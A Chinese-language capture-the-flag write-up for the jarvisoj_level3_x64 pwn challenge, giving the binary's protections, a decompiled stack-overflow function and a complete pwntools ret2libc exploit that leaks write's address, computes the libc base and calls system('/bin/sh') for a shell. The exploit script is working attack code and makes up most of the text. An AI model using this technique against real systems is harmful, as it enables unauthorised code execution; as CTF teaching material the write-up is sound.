jarvisoj_level3_x64

思路

简单的栈溢出泄露write函数真实地址计算基址然后返回mian函数重新构造rop链打就可以getshell了
题目链接：https://buuoj.cn/challenges#jarvisoj_level3_x64

程序信息

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)


保护机制

Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


代码审计

ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  write(1, "Input:\n", 7uLL);
  return read(0, buf, 0x200uLL);
}


直接看ida pro反编译的伪c代码很容易发现有栈溢出，read函数读取0x200个字节到buf里但是实际定义的buf大小没有那么大那么多的数据会溢出。
由于题目里没有给system函数和"/bin/sh"那我们可以通过泄露write函数地址来计算基址通过构造rop链去打就可以getshell简单的ret2libc3但需要注意的是64位程序是通过寄存器传参我们可以通过ROPgadget寻找合适gadgets然后构造rop链去打就可以getshell了。

EXP

EXP1 泄露write函数，加载本地LIBC

# -*- coding: UTF-8 -*-
#by 小渔xiaoyu
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./level3_x64')
sh = elf.process()
#sh = remote('node4.buuoj.cn','25782')
#gdb.attach(sh)
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']
pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_r15_ret_addr = 0x00000000004006b1
print('write_plt[+]:',hex(write_plt))
print('write_got[+]:',hex(write_got))
#leak write addr
payload = ""
payload += "A"*(0x80+0x8)
payload += p64(pop_rdi_ret_addr)
payload += p64(1)
payload += p64(pop_rsi_r15_ret_addr)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main_addr)
sh.recvuntil('Input:\n')
sh.send(payload)
write_addr =u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print("write_addr[+]:",hex(write_addr))
#libc
libc = ELF('./libc-2.23.so')
libc_base=write_addr-libc.sym['write']
system_addr=libc_base+libc.sym['system']
str_bin_sh=libc_base+libc.search('/bin/sh').next()
print('libcbase[+]:',hex(libc_base))
print('system_addr[+]:',hex(system_addr))
print('str_bin_sh[+]:',hex(str_bin_sh))
#getshell
payload =""
payload += 'A'*(0x80+0x8)
payload += p64(pop_rdi_ret_addr)
payload += p64(str_bin_sh)
payload += p64(system_addr)
sh.recvuntil('Input:\n')
sh.send(payload)
sh.interactive()
